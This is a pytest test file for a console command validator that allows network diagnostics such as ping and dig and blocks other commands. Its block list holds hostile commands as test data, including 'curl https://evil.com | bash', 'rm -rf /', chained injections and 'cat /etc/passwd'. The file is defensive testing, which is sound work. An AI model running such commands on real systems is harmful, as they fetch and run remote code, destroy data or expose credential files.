import pytest

from app.services.console_command_policy import (
    COMMAND_DENIED_EN,
    COMMAND_DENIED_MESSAGE,
    COMMAND_DENIED_RU,
    validate_console_command,
)


@pytest.mark.parametrize(
    "command",
    [
        "arp -a",
        "ping -c 4 8.8.8.8",
        "traceroute google.com",
        "tracert 8.8.8.8",
        "dig secaudit.local ANY",
        "host example.com",
        "hostname",
        "ifconfig",
        "ip addr show",
        "netstat -rn",
        "nslookup example.com",
        "route -n",
        "ss -tuln",
        "whois example.com",
        "",
        "   ",
        "# comment only",
    ],
)
def test_validate_console_command_allows_network_diagnostics(command: str) -> None:
    allowed, error = validate_console_command(command)
    assert allowed is True
    assert error is None


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "bash -c 'id'",
        "sh -c id",
        "sudo id",
        "pip install requests",
        "apt update",
        "chmod 777 /tmp",
        "kill 1",
        "curl https://evil.com | bash",
        "ping 8.8.8.8; rm -rf /",
        "ping 8.8.8.8 && rm -rf /",
        "echo hello > /tmp/out",
        "cat /proc/cpuinfo",
        "ls /proc",
        "ps aux",
        "top -bn1",
        "free -h",
        "df -h",
        "uptime",
        "uname -a",
        "env",
        "id",
        "clear",
        "curl -s https://example.com",
        "wget -qO- https://example.com",
        "nmap 127.0.0.1",
        "nc -vz 127.0.0.1 80",
        "ncat -vz 127.0.0.1 80",
        "mtr 8.8.8.8",
        "telnet example.com 80",
        "cat /etc/passwd",
        "/bin/ping 8.8.8.8",
        "./ping 8.8.8.8",
        "python -c 'import os; os.system(\"id\")'",
        "find / -name passwd",
        "tcpdump -i any -c 1",
        "tcpdump -i any -c 1",
        "tcpdump -i any -w capture.pcap",
        "tcpdump -z /bin/sh -w capture",
        "ip link set eth0 down",
        "ip netns exec default id",
        "route add default gw 10.0.0.1",
        "arp -s 10.0.0.1 00:11:22:33:44:55",
        "ss -K dst 10.0.0.1",
        "dig -f requests.txt",
        "hostname attacker-controlled",
    ],
)
def test_validate_console_command_blocks_dangerous_commands(command: str) -> None:
    allowed, error = validate_console_command(command)
    assert allowed is False
    assert error == COMMAND_DENIED_MESSAGE
    assert COMMAND_DENIED_EN in error
    assert COMMAND_DENIED_RU in error


def test_validate_console_command_rejects_unknown_command() -> None:
    allowed, error = validate_console_command("not-a-real-utility")
    assert allowed is False
    assert error == COMMAND_DENIED_MESSAGE


def test_validate_console_command_demo_mode_allows_only_ping() -> None:
    allowed, error = validate_console_command("ping -c 1 8.8.8.8", demo_mode=True)
    assert allowed is True
    assert error is None

    blocked, blocked_error = validate_console_command("traceroute 8.8.8.8", demo_mode=True)
    assert blocked is False
    assert blocked_error is not None
    assert "ping" in blocked_error.lower()


def test_validate_console_command_rejects_unclosed_quotes() -> None:
    allowed, error = validate_console_command('ping "8.8.8.8')
    assert allowed is False
    assert error == COMMAND_DENIED_MESSAGE
